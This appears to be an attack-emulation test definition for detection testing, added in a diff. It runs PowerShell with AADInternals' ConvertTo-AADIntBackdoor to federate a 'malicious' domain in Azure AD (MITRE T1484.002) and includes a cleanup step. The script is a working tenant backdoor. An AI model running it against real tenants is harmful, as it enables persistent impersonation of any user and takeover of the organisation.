@@ -1,0 +1,100 @@
+api_version: "2.0"
+name: Add Federation to Azure AD
+description: |
+    Add a new federated domain to Azure AD using PowerShell.
+    The malicious domain to be federated must be configured beforehand (outside of the scope of this test):
+        1. Open Azure Portal
+        2. Add a new "custom domain name"
+        3. Verify the domain by following instructions (i.e. create the requested DNS record)
+args:
+    - name: azure_username
+      type: string
+      default: bruce.wayne@contosocloud.com
+    - name: azure_password
+      type: string
+      default: iamthebatman
+    - name: domain_name
+      type: string
+      default: contoso.com
+uuid: 8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1484: Domain or Tenant Policy Modification'
+    subtechniques:
+        - 'T1484.002: Trust Modification'
+requirements:
+    platforms:
+        - os: azure-ad
+steps:
+    - name: |
+        AzureAD and AADInternals Powershell modules must be installed.
+      inline: |
+        if ((Get-Module -ListAvailable -Name AzureAD) -And (Get-Module -ListAvailable -Name AADInternals)) {exit 0} else {{Install-Module -Name AzureAD -Force
+        Install-Module -Name AADInternals -Force
+        }}
+      executor: powershell
+    - name: add-federation-to-azure-ad
+      inline: |
+        Import-Module AzureAD
+        Import-Module AADInternals
+
+        $PWord = ConvertTo-SecureString -String "{{.Args.azure_password}}" -AsPlainText -Force
+        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "{{.Args.azure_username}}", $Pword
+
+        try {
+          Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null
+        }
+        catch {
+          Write-Host "Error: AzureAD could not connect"
+          exit 1
+        }
+
+        try {
+          $domain = Get-AzureADDomain -Name "{{.Args.domain_name}}"
+        }
+        catch {
+          Write-Host "Error: domain ""{{.Args.domain_name}}"" not found"
+          exit 1
+        }
+        if (-Not $domain.IsVerified) {
+          Write-Host "Error: domain ""{{.Args.domain_name}}"" not verified"
+          exit 1
+        }
+
+        if ($domain.AuthenticationType -eq "Federated") {
+          Write-Host "Error: domain ""{{.Args.domain_name}}"" already federated. Try with a different domain or re-create it before."
+          exit 1
+        }
+
+        $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
+        if (-Not $at) {
+          Write-Host "Error: AADInternals could not connect"
+          exit 1
+        }
+
+        $new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName "{{.Args.domain_name}}"
+        if ($new) {
+          Write-Host "Federation successfully added to Azure AD"
+          Write-Host $new
+        }
+        else {
+          Write-Host "The federation setup failed"
+        }
+
+        Write-Host "End of federation configuration."
+      executor: powershell
+      cleanup:
+        inline: |
+            try {
+              Import-Module AzureAD -ErrorAction Ignore
+
+              $PWord = ConvertTo-SecureString -String "{{.Args.azure_password}}" -AsPlainText -Force
+              $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "{{.Args.azure_username}}", $Pword
+              Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null
+
+              Remove-AzureADDomain -Name "{{.Args.domain_name}}" -ErrorAction Ignore
+            } catch {}
+        executor: powershell
